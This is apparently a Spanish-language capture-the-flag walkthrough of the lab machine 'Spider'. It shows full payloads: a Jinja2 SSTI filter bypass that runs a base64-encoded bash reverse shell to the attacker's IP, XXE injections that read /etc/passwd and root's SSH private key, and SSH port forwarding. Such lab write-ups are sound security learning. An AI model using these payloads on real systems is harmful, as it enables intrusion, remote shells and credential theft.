Todo nos lo bloquea el [WAF (Web Application Firewall)](https://www.optical.pe/blog/que-es-un-waf/), pero podemos intentar bypassear estos filtros a ver si tenemos suerte.

...

Sabiendo que ya explotamos un **SSTI** y que seguimos en la web, podemos pensar que el apartado extra√±o (`supportportal`) sigue corriendo sobre **Jinja2** y que podr√≠a ser vulnerable a **SSTI**.

> Adem√°s el backend esta bloqueando caracteres que son usados comunmente por un <u>template</u>, as√≠ que podemos reforzar la idea que debamos explotar otro <u>SSTI</u>, pero ahora bypasseando algunos filtros...

...

### Burlando backend para conseguir <u>RCE</u> explotando <u>SSTI</u> [‚õ∑Ô∏è](#shop-support-ticket-ssti-rce) {#shop-support-ticket-ssti-rce}

Jugando de nuevo con nuestros recursos llenos de payloads, [encontramos algo](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python) b√°sicamente dici√©ndonos: "**Toma, expl√≥talo YAAAAAA!**":

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350google_rce_without_brackets.png" style="width: 100%;"/>

{% raw %}
```jinja2
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC40LzkwMDEgMD4mMQ== | base64 -d | bash")["read"]() %} a {% endwith %}
```
{% endraw %}

> Tomado de: [hacktricks.xyz - SSTI Jinja2](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python).

Es muy sencillo lo que hace, primero bypassea el car√°cter `_` pas√°ndolo a hexadecimal `\x5f`, toma las clases del sistema e importa entre ellas "`os`", con ella ejecuta el `echo XYZ | base64 -d | bash`, que seria tomar la cadena en base64 (nuestro payload), decodificarlo e interpretarlo.

...

Excelente post para profundizar en **SSTI**, adem√°s esta escrito por **<u>chiv</u>**, uno de los creadores de esta m√°quina:

* [Jinja2 SSTI Research](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/).

...

Bien, pues creemos nuestro payload para obtener una reverse Shell y probemos:

```bash
‚ù± echo "bash -i >& /dev/tcp/10.10.14.146/4433 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQzMyAwPiYxCg==
```

La agregamos al payload:

{% raw %}
```jinja2
{% with a = request["application"]["\x5f\x5fglobals\x5f\x5f"]["\x5f\x5fbuiltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]("os")["popen"]("echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDYvNDQzMyAwPiYxCg== | base64 -d | bash")["read"]() %} a {% endwith %}
```
{% endraw %}

Nos ponemos en escucha:

```bash
‚ù± nc -lvp 4433
```

Y ahora hacemos la petici√≥n:

![350page80_ticket_rce_payload](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350page80_ticket_rce_payload.png)

Y si revisamos nuestro listeneeeeeeeeeeeeeeeeer...

![350bash_chivRevSH](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350bash_chivRevSH.png)

OPAAAA, obtenemos nuestra **reverse Shell**, y estamos en el sistema como **chiv**, perfect√≠siiiiimo.

...

En el directorio `/home` de **chiv** encontramos su llave privada **SSH**, la tomamos, nos la pasamos a nuestro sistema y le damos los [permisos necesarios](https://www.google.com/search?client=firefox-b-d&q=correct+permissions+to+id_rsa), as√≠ podemos obtener una sesi√≥n **SSH** con tranquilidad y dejar la **Reverse Shell** (:

```bash
‚ù± ssh chiv@10.10.10.243 -i chiv_priv_rsa 
...
chiv@spider:~$
```

Listones, ahora s√≠, veamos como escalar el monte.

...

# Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Enumerando los archivos que conforman la web, encontramos `app.py` que ser√≠a el que controla todo. En su contenido encontramos las credenciales del usuario **chivato** para el servicio `MySQL` (la base de datos):

![350bash_chivSH_credsMySQL](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350bash_chivSH_credsMySQL.png)

Podemos guardarlas por si algo...

Listando los servicios activos en la m√°quina encontramos el puerto **8080** siendo usado localmente:

```bash
chiv@spider:/var/www$ netstat -ln
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
...
```

Si jugamos con `cURL` logramos ver que nos responde y adem√°s parece una web activa:

```bash
chiv@spider:/var/www$ curl http://localhost:8080
```

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/login">/login</a>.  If not click the link.
```

Intenta redirigirnos a `/login`, veamos que hay en √©l:

```bash
chiv@spider:/var/www$ curl -L http://localhost:8080
```

```html
<link href='https://fonts.googleapis.com/css?family=Open+Sans:700,600' rel='stylesheet' type='text/css'>
<link href='/static/css/login.css' rel='stylesheet' type='text/css'>

<form method="post">
<div class="box">
<h1> Beta Login </h1>

<input type="text" name="username" placeholder="username" onFocus="field_focus(this, 'email');" onblur="field_blur(this, 'email');" class="email" />
<input type="hidden" id="version" name="version" value="1.0.0">
  
 <input class="btn" type="submit" value="Sign In">
  
</div> <!-- End Box -->
  
</form>

<p>Forgot your password? <u style="color:#f1c40f;">Click Here!</u></p>
  
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.0/jquery.min.js" type="text/javascript"></script>
<script src="/static/js/login.js" type="text/javascript"></script>
```

Jmmmmmm, solo hay un campo llamado `username`, una versi√≥n escondida (que buscando no hay nada) y un link (que no es link) hacia una contrase√±a olvidada... 

Pues se ve interesante, juguemos con un [**port-fortwarding**](https://linuxize.com/post/how-to-setup-ssh-tunneling/) para indicarle que nos replique el contenido de ese puerto en un puerto nuestro, en este caso hag√°moslo en el puerto **8080**:

...

## Enumeramos puerto <u>8080</u> del <u>localhost</u> mediante un <u>port-fortwarding</u> [üìå](#fortwarding-enum-8080) {#fortwarding-enum-8080}

Validamos que no haya nada sobre ese puerto:

```bash
‚ù± lsof -i:8080
```

Y efectuamos el **port-fortwarding**:

```bash
‚ù± ssh chiv@10.10.10.243 -L 8080:localhost:8080 -i chiv_priv_rsa
```

> Le dice que tome el puerto **8080** del localhost y lo replique en nuestro puerto **8080**, el resto es autenticaci√≥n.

Validamos si hay contenido ahora en el puerto:

```bash
‚ù± lsof -i:8080
COMMAND    PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
ssh     377183 root    4u  IPv6 1617711      0t0  TCP localhost:http-alt (LISTEN)
ssh     377183 root    5u  IPv4 1617712      0t0  TCP localhost:http-alt (LISTEN)
```

Perfecto, pues juguemos.

![350pagelocalhost8080_login](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350pagelocalhost8080_login.png)

Bien, lo que ya sab√≠amos que conten√≠a pero ahora con un formato lindo (: 

Lo raro es que dice ser un login, pero solo pide un campo, escribiendo **lanz** y dando clic en `Sign In` caemos ac√°:

![350pagelocalhost8080_site1](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350pagelocalhost8080_site1.png)

![350pagelocalhost8080_site2](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350pagelocalhost8080_site2.png)

> Mucho blancoooooooooooo

La √∫nica interacci√≥n en ese apartado es el bot√≥n `logout` (que nos termina la sesi√≥n como **lanz** y volvemos al `/login`), de resto no podemos hacer nada m√°s ah√≠...

Probando cositas y cositas no consegu√≠ nada, volv√≠ a la sesi√≥n **SSH** y enumer√© de nuevo a ver si hab√≠a algo relacionado con ese sitio web, lo curioso es que s√≠, hay cositas:

```bash
chiv@spider:/var/www$ ls -la
total 20
drwxr-xr-x  5 root root     4096 May 18 00:23 .
drwxr-xr-x 14 root root     4096 May 18 00:23 ..
drw-r--r--  6 root www-data 4096 May 18 00:23 game
drwxr-xr-x  2 root root     4096 May 18 00:23 html
drwxr-xr-x  5 chiv chiv     4096 Jul 13 20:36 webapp
```

En la ruta `/var/www` tenemos los servicios web `webapp` (la que ya explotamos, la tienda de sillas e.e) y `html` que muestra la p√°gina por default de `nginx`.

...

Peeero (como s√© que no est√°n ciegos (¬øo si? üòÅ)) hay otra carpeta llamada `game`, de la que **root** es propietario y a la que el usuario **www-data** tiene acceso, si nosotros intentamos listar su contenido logramos ver que archivos hay, pero a la hora de querer ver cada uno de ellos nos indica que no tenemos permisos:

```bash
chiv@spider:/var/www$ ls -la game/
ls: cannot access 'game/templates': Permission denied
ls: cannot access 'game/__MACOSX': Permission denied
ls: cannot access 'game/__pycache__': Permission denied
ls: cannot access 'game/wsgi.py': Permission denied
ls: cannot access 'game/..': Permission denied
ls: cannot access 'game/.': Permission denied
ls: cannot access 'game/app.py': Permission denied
ls: cannot access 'game/game.ini': Permission denied
ls: cannot access 'game/static': Permission denied
total 0
d????????? ? ? ? ?            ? .
d????????? ? ? ? ?            ? ..
d????????? ? ? ? ?            ? __MACOSX
d????????? ? ? ? ?            ? __pycache__
-????????? ? ? ? ?            ? app.py
-????????? ? ? ? ?            ? game.ini
d????????? ? ? ? ?            ? static
d????????? ? ? ? ?            ? templates
-????????? ? ? ? ?            ? wsgi.py
```

```bash
chiv@spider:/var/www$ cat game/*
cat: game/__MACOSX: Permission denied
cat: game/__pycache__: Permission denied
cat: game/app.py: Permission denied
cat: game/game.ini: Permission denied
cat: game/static: Permission denied
cat: game/templates: Permission denied
cat: game/wsgi.py: Permission denied
```

Lo llamativo es que tiene los mismos (la estructura) archivos que `webapp`, por lo que podemos pensar que el sitio web que esta sirviendo en el puerto **8080** este relacionado con estos fuentes (:

Profundizando un toquesito m√°s, confirmamos lo anterior. Si buscamos [los demonios](https://voragine.net/linux/como-crear-y-gestionar-demonios-en-linux-con-systemd) del sistema, encontramos los dos que nos representan:

```bash
chiv@spider:/etc/systemd/system$ cat /etc/systemd/system/webapp.service
```

```bash
[Unit]
Description=Our brand new furniture store!
After=network.target mysql.service

[Service]
User=chiv
Group=www-data
WorkingDirectory=/var/www/webapp/
ExecStart=/usr/local/bin/uwsgi --ini webapp.ini

[Install]
WantedBy=multi-user.target
```

Donde vemos que el usuario propietario es **chiv**, la ruta donde est√°n los archivos est√°n en `/var/www/webapp/` y el servicio web es ejecutado con el binario [uwsgi](https://www.digitalocean.com/community/tutorials/como-hacer-funcionar-aplicaciones-de-flask-con-uwsgi-y-nginx-en-ubuntu-18-04-es) por medio de un archivo `.ini` (sin ruta absoluta, pero supongo que no puede ser cambiada, ya que debe tomar el que est√© en la ruta `webapp`).

R√°pidamente miramos el archivo `webapp.ini`:

```bash
chiv@spider:/var/www/webapp$ cat webapp.ini 
[uwsgi]
module = app:app

master = true
processes = 5

socket = /var/www/webapp/webapp.sock
chmod-socket = 660
vacuum = true

die-on-term = true
```

Instrucciones que entiende el binario `uwsgi`...

YYYYYY el juegazo:

```bash
chiv@spider:/etc/systemd/system$ cat /etc/systemd/system/game.service 
```

```bash
[Unit]
Description=Beta clicker game, a bit shit
After=network.target

[Service]
User=root
Group=www-data
WorkingDirectory=/var/www/game/
ExecStart=/usr/local/bin/uwsgi --ini game.ini

[Install]
WantedBy=multi-user.target
```

**Beta clicker game, un poco mierda** jajaj, linda descripci√≥n.

*(El servicio se llama **Beta...** y la web se llama **Beta Login**)*

El propietario es **root**, los archivos est√°n en la ruta `/var/www/game/` y esta siendo ejecutado con ayuda del archivo `game.ini` (al cual no tenemos acceso, pero podemos imaginar su contenido seg√∫n el archivo `webapp.ini`).

As√≠ que confirmamos que la web esta siendo ejecutada por el usuario **root**.

...

ESTOY fuuuuuuuuuuuuuuuuuuuuull perdido, lo m√°s probable es que debamos inyectar algo en el campo **username**, pero de lo que intento no logro nada, cambio y fuera, seguir√© reportando.

...

Sigo perdido... Cambio y fuera, decayendo.

...

Busquemos ayuda mejor (: cambio y fuera.

...

## Volvemos a jugar con <u>flask-unsign</u> para encontrar estructura <u>XML</u> [üìå](#fortwarding-unsign-xml) {#fortwarding-unsign-xml}

La ayuda me indico que volviera a jugar con **flask-unsign** y pues si, no lo hab√≠a pensado a pesar de haber visto la cookie...

Pues veamos:

```bash
‚ù± COOKIE=.eJxNjLtugzAARX-l8twBU5oBKQvygzqFyAbbwGbLUSA8SgNqCVH-vY2USh2Pzrn3Crql70B4BU8WhEDilDi85LxlSuh5UD3UB51cbFw1RpIgp2PkJES8EIlC4l3ieuf6t1VmM_r1QybTaE_GWJyi6u7vXHkd4tox7uGgIvXe0nROdd0oKM9l66jT6tO9VK3Gr1Ppe9BQVqh_f489F_6y0YhR47PCxoqbFgc5YtOhO15EPzfKX6Ck7uuv52t31qrODIkGu9ZJ4o1-eUrF7nu7BbdnMH40wzyB0Lv9AJxnVf8.YO5Anw.7XeFrUdE2369dARShP0kHmS5axA
```

```bash
‚ù± flask-unsign --unsign --cookie $COOKIE
[*] Session decodes to: {'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bGFuejwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+', 'points': 0}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[!] Failed to find secret key after 37610 attempts.31
```

Obtenemos el formato de la cookie:

```json
{
  'lxml': b'PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bGFuejwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+', 
  'points': 0
}
```

Jmmm, [**lxml**](https://www.josedomingo.org/pledin/2015/01/trabajar-con-ficheros-xml-desde-python_1/), procesador de peticiones XML con HTML... Interesannnnnnteeeeeeee... Tambi√©n vemos lo que parecer ser una cadena en **base64**, intentemos decodearla (ojal√° sea b64):

```bash
‚ù± echo "PCEtLSBBUEkgVmVyc2lvbiAxLjAuMCAtLT4KPHJvb3Q+CiAgICA8ZGF0YT4KICAgICAgICA8dXNlcm5hbWU+bGFuejwvdXNlcm5hbWU+CiAgICAgICAgPGlzX2FkbWluPjA8L2lzX2FkbWluPgogICAgPC9kYXRhPgo8L3Jvb3Q+" | base64 -d
```

```xml
<!-- API Version 1.0.0 -->
<root>
    <data>
        <username>lanz</username>
        <is_admin>0</is_admin>
    </data>
</root>
```

OPAAAAAAA, una estructura [XML](https://rockcontent.com/es/blog/que-es-xml/) con nuestro **username** y uno que indica si somos admins, este √∫ltimo es raro, ya que no hay nada interesante que podamos hacer siendo admins (creo)...

A ver, pensemos... Si la cookie que nos genera una vez nos "logeamos" esta en formato **XML**, puede significar que la data enviada desde el `/login` viaje con ese formato, pooooor lo taaaaaaaanto, podemos pensar que debemos explotar algo relacionado con **XML** ¬øno?

Hace un tiempo jugu√© con una web vulnerable a [**XPath Injection**](https://owasp.org/www-community/attacks/XPATH_Injection), pero en ese caso fue para extraer campos de contrase√±as yyy en esta web no parece que sean relevantes tener campos ocultos de contrase√±as (ya que no existe un login como tal, a cualquier usuario que pongamos en el campo `username` le permite entrar). 

Por lo que me dispuse a buscar ataques que se puedan llevar a cabo contra **XML**, encontramos uno que no he usado a√∫n, **XML External Entity (XXE)**.

ü™Ä ***Un XXE es una inyecci√≥n de c√≥digo en una aplicaci√≥n que analiza datos <u>XML</u>***. [Los peligros de los ataques XXE](https://www.a2secure.com/blog/los-peligros-de-los-ataques-xml-external-entity-xxe/)

Sencillito y f√°cil de digerir... Pueeeees, veamos como se puede explotar.

...

## Entendemos el <u>XXE</u> [üìå](#fortwarding-xxe) {#fortwarding-xxe}

Si quieres ir directamente a la parte donde explotamos el **XXE** para leer archivos del sistema, sigue este link:

* [Leemos archivos del sistema como usuario **root** por medio del **XXE**](#fortwarding-xxe-idrsa-root).

...

B√°sicamente la explotaci√≥n se da gracias a la creaci√≥n de una **entidad**, como bien lo explica [a2secure](https://www.a2secure.com/blog/los-peligros-de-los-ataques-xml-external-entity-xxe/):

üï≥Ô∏è ***La inyecci√≥n ocurre mediante un concepto llamado <u>entidad</u> que almacena cualquier tipo de dato. Esta entidad funciona como el t√©rmino conocido en programaci√≥n de <u>variable</u>***.

As√≠ que es como declarar una variable que nos va a ayudar a guardar algo, entendible, me gusta, explotemoooossss!!

Jugando con payloads y **BurpSuite** (porque podemos modificar el encoding que hace y ver como viaja la data) encontramos algo interesante:

Normalmente (no obligatoriamente) cuando una web esta trabajando con datos **XML** nos encontramos con que [su header **Content-Type**](https://stackoverflow.com/questions/2965587/valid-content-type-for-xml-html-and-xhtml-documents) lleva ya sea:

* `text/xml`
* `application/xml`

Peeeero en nuestro caso no es as√≠, en nuestra petici√≥n tenemos [application/x-www-form-urlencoded](https://developer.mozilla.org/es/docs/Web/HTTP/Methods/POST), que lo que hace es tomar la data y separarlas por objetos "llave:valor", por ejemplo `username=lanz`, donde `username` ser√≠a la llave y `lanz` ser√≠a el valor.

La cosa es que cuando se trabaja con un `Content-Type` basado en **XML** la data no viaja as√≠, sino as√≠:

* `<username>lanz</username>`

(Como la estructura que vimos en nuestra cookie).

Peeeeeeeeeeeeero, no podemos simplemente cambiar el `Content-Type` original por `text/xml` y remplazar `username=lanz` por `<username>lanz</username>`, el backend no entender√° eso y obtendremos un error o simplemente no obtendremos nada. **Ac√° es donde tenemos que pensar como mezclar nuestra inyecci√≥n `XML` con el viaje de la data**.

...

La petici√≥n normal va as√≠:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burplocalhost8080_login.png" style="width: 100%;"/>

Y sabemos que una vez iniciamos sesi√≥n, en el apartado `/site` vemos nuestro **username**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burplocalhost8080_username_site.png" style="width: 100%;"/>

Pues esto nos refuerza que debemos jugar con el campo **username**, ya sea para ver errores o el contenido de una entidad que creemos...

...

Tomando ejemplos de:

* [OWASP - XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing).

Vemos que se pueden hacer varias cositas, principalmente (en la que nos centraremos) podemos leer archivos del sistema, siempre y cuando el usuario con el que estemos pueda leerlos. Como estamos casi seguros que es **root** el que esta corriendo esta web, podemos pensar que tendremos acceso a cualquier archivo.

Intentemos obtener el contenido del archivo `/etc/passwd`, podemos crear una entidad tal que as√≠:

```xml
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```

> <u>Tiene</u> que ser one-liner por lo que ya hablamos, la web originalmente NO esta procesando estructuras **XML**.

La parte importante esta en `<!ENTITY ... >`, ah√≠ creamos la entidad (variable) llamada `xxe` que tomara el contenido del archivo `/etc/passwd` y lo guardara... Yyyy ser√° mostrada por el √≠tem `foo` (que creamos) en alguna parte de la web.

Un rato perdido en como deber√≠amos pasar esa l√≠nea en la petici√≥n, me llevo a este recurso:

* [Exploitation: XML External Entity (XXE) Injection](https://depthsecurity.com/blog/exploitation-xml-external-entity-xxe-injection).

Donde si bajamos y bajamos encontramos algunas pruebas que hace con ayuda de **Burp**, algo interesante es donde guarda el resultado de la **entidad**, ya que no crea un √≠tem "`foo`", sino que usa los mismos atributos que conforman la estructura **XML**, (¬øalgo enredado?, nada, veamos un ejemplo de lo que digo):

En nuestro caso sabemos que viajan dos valores, `username` y `version`, podr√≠amos pensar guardar el resultado de nuestra entidad as√≠:

```xml
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><username>&xxe;</username>   
```

Peeeeeeeeeeero, volviendo a lo que dijimos antes, el backend no va a entender esa etiqueta `<`, ya que la data no viaja as√≠, por lo cuaaaaaaaal, podemos pensar en algo muuucho mejor:

```xml
username=&xxe;&version=1.0.0<?xml version="1.0" encoding="utf-8"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>  
```

Donde el valor de la entidad (variable `xxe`) es enviada como `username`, por lo que si tooooooodo va perfecto, en el apartado `/site` ver√≠amos el contenido de esa variable, o sea, el contenido del `/etc/passwd`, tiene much√≠simo sentido, no? Que lindo esto jajaj

Pero claro, si queremos enviar esa petici√≥n como tal, debemos jugar con **URLencode**, ya que **BurpSuite** explotara con los `espacios` y los caracteres `&;` que no son de la petici√≥n oooooooriginal (sencillamente no entiende la petici√≥n y la transforma por otra): 

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burplocalhost8080_xml_withoutURLenc.png" style="width: 100%;"/>

Y dici√©ndole que no tome `xxe` como variable de la petici√≥n y que cambie los `espacios` para que est√©n dentro de tooodo el **XML**:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burplocalhost8080_xml_withURLenc.png" style="width: 100%;"/>

Perfecto, la vaina es que si la ejecutamos obtenemos **ERROR**, literal:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350pagelocalhost8080_site_error.png" style="width: 100%;"/>

Lo cual esta bien, porque quiere decir que estamos haci√©ndole algo al backend...

> Despues de algunas pruebas que no pondre para no aburrirlos.

Podemos pensar que debemos indicarle el inicio de nuestra inyecci√≥n **XML**, esto sale f√°cil gracias a los comentarios, le decimos, toma todo lo anterior a `<?xml` como comentarios y toooodo lo que esta despu√©s de `>]>` tambi√©n, pues, simplific√°ndolo ser√≠a algo as√≠:

```xml
COMENTARIOS--><?xml+version="1.0"........file:///etc/passwd"+>]><!--COMENTARIOS
```

Para que as√≠, si o si interprete nuestro contenido **XML**...

***Pero seguimos obteniendo error...***

Ac√° ya fue prueba y error, en una de las pruebas se me ocurri√≥ que quiz√°s nuestra definici√≥n de `xml` era innecesaria, ya que los datos originalmente est√°n siendo le√≠dos como **XML**, por lo tanto nuestra definici√≥n de entidad tambi√©n lo ser√°. Y pues que estar√≠a causando alg√∫n conflicto o algo as√≠ (prueba y error), pues vaya vaya...

...

## Leemos archivos del sistema como <u>root</u> con el <u>XXE</u> [üìå](#fortwarding-xxe-idrsa-root) {#fortwarding-xxe-idrsa-root}

Si modificamos nuestra inyecci√≥n sin la definici√≥n del `?xml` nos quedar√≠a as√≠:

```xml
COMENTARIOS--><!DOCTYPE........file:///etc/passwd"+>]><!--COMENTARIOS
```

La petici√≥n seria:

![350burplocalhost8080_xxe_passwd_without_tagxml](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burplocalhost8080_xxe_passwd_without_tagxml.png)

La enviamos yyyyyyyyyyyyyy:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350pagelocalhost8080_xxe_passwd_without_tagxml_done.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350pagelocalhost8080_xxe_passwd.png" style="width: 100%;"/>

OPAAAAAAAAAAAAAAA conseguimos leer archivos del sistema explotando un **XXE** üòØ

Pero no podemos hacer mucho con el `/etc/passwd`, vimos que **chiv** ten√≠a una llave privada, veamos si **root** tambi√©n (y si nos la deja ver):

```xml
ahh--><!DOCTYPE+foo+[<!ELEMENT+foo+ANY+><!ENTITY+xxe+SYSTEM+"file:///root/.ssh/id_rsa"+>]><!--ahh
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350burplocalhost8080_xxe_rootIDrsa.png" style="width: 100%;"/>

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350pagelocalhost8080_xxe_rootIDrsa.png" style="width: 100%;"/>

Listoooooones, la copiamos, la guardamos en un archivo, le damos los permisos e intentamos entrar por **SSH** a su sesi√≥n:

```bash
‚ù± ssh root@10.10.10.243 -i root_priv_rsa
```

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350bash_ssh_rootSH.png" style="width: 100%;"/>

SI SEEEEE√ëOOORRRR, tamos dentro como el usuario **root**, solo nos quedar√≠a ver las flags...

![350flags](https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350flags.png)

Y hemos terminado (:

<img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/spider/350google_gif_theend_withagun.gif" style="width: 80%;"/>

...

Linda m√°quina, muuuuuuuuuuuuuucho jugueteo web, lo cual esta incre√≠ble, fue toodo inyecciones, **SSTI**, **SQLI** y **XXE**, bastante divertido.

Explorar el **XXE** fue bonito y m√°s siendo la primera vez ante √©l, me gusta el enfoque que se le puede dar a esa vuln.

Y bueno, no siendo m√°s, nos leeremos despu√©s, muchas gracias por tu tiempo y como sieeeeeempre, a seguir rompiendo todo!